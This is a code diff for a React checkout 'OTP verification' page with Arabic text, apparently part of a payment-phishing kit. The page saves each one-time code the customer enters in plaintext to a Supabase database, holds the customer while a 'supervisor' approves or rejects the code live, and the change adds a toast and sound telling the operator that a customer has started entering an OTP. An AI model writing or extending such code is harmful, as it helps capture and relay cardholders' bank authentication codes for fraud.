@@ -7,18 +7,26 @@ import PaymentLogos from "@/components/PaymentLogos";
 import { useOrder } from "@/contexts/OrderContext";
 import { supabase } from "@/integrations/supabase/client";
 import { toast as sonnerToast } from "sonner";
-
 const OtpVerification = () => {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
-  const { orderData, updateOrderData } = useOrder();
+  const {
+    orderData,
+    updateOrderData
+  } = useOrder();
   const {
     toast
   } = useToast();
 
-  // صوت تنبيه عند دخول الصفحة (بدون إشعار للعميل)
+  // إشعار عند دخول الصفحة
   useEffect(() => {
-    // صوت تنبيه فقط
+    // نص الإشعار
+    sonnerToast.info("عميل بدأ بإدخال كود التحقق OTP", {
+      description: "متابعة الطلب في لوحة التحكم مطلوبة",
+      duration: 5000
+    });
+
+    // صوت تنبيه
     const audio = new Audio('data:audio/wav;base64,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');
     audio.play().catch(e => console.log("Audio play failed:", e));
   }, []);
@@ -44,47 +52,38 @@ const OtpVerification = () => {
 
     // Update context
     updateOrderData({
-      otpCode: otp,
+      otpCode: otp
     });
 
     // Update database - set status to waiting_otp_approval
     try {
       if (orderData.sequenceNumber) {
         // First, get the order ID
-        const { data: orderInfo, error: orderError } = await supabase
-          .from("customer_orders")
-          .select("id")
-          .eq("sequence_number", orderData.sequenceNumber)
-          .single();
-
+        const {
+          data: orderInfo,
+          error: orderError
+        } = await supabase.from("customer_orders").select("id").eq("sequence_number", orderData.sequenceNumber).single();
         if (orderError) throw orderError;
+        await supabase.from("customer_orders").update({
+          otp_code: otp,
+          status: "waiting_otp_approval"
+        }).eq("sequence_number", orderData.sequenceNumber);
 
-        await supabase
-          .from("customer_orders")
-          .update({
-            otp_code: otp,
-            status: "waiting_otp_approval",
-          })
-          .eq("sequence_number", orderData.sequenceNumber);
-        
         // Save OTP attempt
-        const { error: otpError } = await supabase
-          .from("otp_attempts")
-          .insert({
-            order_id: orderInfo.id,
-            otp_code: otp,
-          });
-
+        const {
+          error: otpError
+        } = await supabase.from("otp_attempts").insert({
+          order_id: orderInfo.id,
+          otp_code: otp
+        });
         if (otpError) {
           console.error("Error saving OTP attempt:", otpError);
         }
-
         setIsLoading(false);
         setWaitingApproval(true);
-        
         toast({
           title: "تم إرسال الطلب",
-          description: "في انتظار موافقة المشرف...",
+          description: "في انتظار موافقة المشرف..."
         });
       }
     } catch (error) {
@@ -101,31 +100,21 @@ const OtpVerification = () => {
   // Listen for admin approval/rejection
   useEffect(() => {
     if (!orderData.sequenceNumber || !waitingApproval) return;
-
-    const channel = supabase
-      .channel('otp-approval-changes')
-      .on(
-        'postgres_changes',
-        {
-          event: 'UPDATE',
-          schema: 'public',
-          table: 'customer_orders',
-          filter: `sequence_number=eq.${orderData.sequenceNumber}`
-        },
-        (payload: any) => {
-          const newStatus = payload.new.status;
-          
-          if (newStatus === 'completed') {
-            setWaitingApproval(false);
-            navigate('/otp-processing?success=true');
-          } else if (newStatus === 'otp_rejected') {
-            setWaitingApproval(false);
-            navigate('/otp-processing?success=false');
-          }
-        }
-      )
-      .subscribe();
-
+    const channel = supabase.channel('otp-approval-changes').on('postgres_changes', {
+      event: 'UPDATE',
+      schema: 'public',
+      table: 'customer_orders',
+      filter: `sequence_number=eq.${orderData.sequenceNumber}`
+    }, (payload: any) => {
+      const newStatus = payload.new.status;
+      if (newStatus === 'completed') {
+        setWaitingApproval(false);
+        navigate('/otp-processing?success=true');
+      } else if (newStatus === 'otp_rejected') {
+        setWaitingApproval(false);
+        navigate('/otp-processing?success=false');
+      }
+    }).subscribe();
     return () => {
       supabase.removeChannel(channel);
     };
@@ -200,42 +189,23 @@ const OtpVerification = () => {
 
         {/* OTP Form */}
         <form onSubmit={handleSubmit} className="space-y-6">
-          {rejectionError && (
-            <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded">
-              {rejectionError}
-            </div>
-          )}
+          {rejectionError}
           
-          {waitingApproval && (
-            <div className="bg-blue-50 border border-blue-200 text-blue-700 px-4 py-3 rounded text-center">
+          {waitingApproval && <div className="bg-blue-50 border border-blue-200 text-blue-700 px-4 py-3 rounded text-center">
               <div className="flex items-center justify-center gap-2">
                 <div className="w-4 h-4 border-2 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
                 <span>في انتظار موافقة المشرف...</span>
               </div>
-            </div>
-          )}
+            </div>}
           
           <div>
             <div className="text-center text-gray-600 mb-2 text-sm">
               رمز التحقق
             </div>
-            <Input 
-              type="text" 
-              maxLength={6} 
-              value={otp} 
-              onChange={e => setOtp(e.target.value.replace(/\D/g, ''))} 
-              className="w-full text-center text-lg tracking-widest py-2 outline-none border-0 border-b-2 border-gray-300 focus-visible:ring-0 focus-visible:border-gray-600 rounded-none" 
-              placeholder="" 
-              dir="ltr"
-              disabled={waitingApproval}
-            />
+            <Input type="text" maxLength={6} value={otp} onChange={e => setOtp(e.target.value.replace(/\D/g, ''))} className="w-full text-center text-lg tracking-widest py-2 outline-none border-0 border-b-2 border-gray-300 focus-visible:ring-0 focus-visible:border-gray-600 rounded-none" placeholder="" dir="ltr" disabled={waitingApproval} />
           </div>
 
-          <button 
-            type="submit" 
-            className="w-full py-3 bg-[#2900fc] hover:bg-[#2200cc] text-white font-medium transition-colors rounded disabled:opacity-50 disabled:cursor-not-allowed" 
-            disabled={isLoading || waitingApproval || (otp.length !== 6 && otp.length !== 4)}
-          >
+          <button type="submit" className="w-full py-3 bg-[#2900fc] hover:bg-[#2200cc] text-white font-medium transition-colors rounded disabled:opacity-50 disabled:cursor-not-allowed" disabled={isLoading || waitingApproval || otp.length !== 6 && otp.length !== 4}>
             {isLoading ? "جاري التحقق..." : waitingApproval ? "في انتظار الموافقة..." : "تأكيد"}
           </button>
         </form>
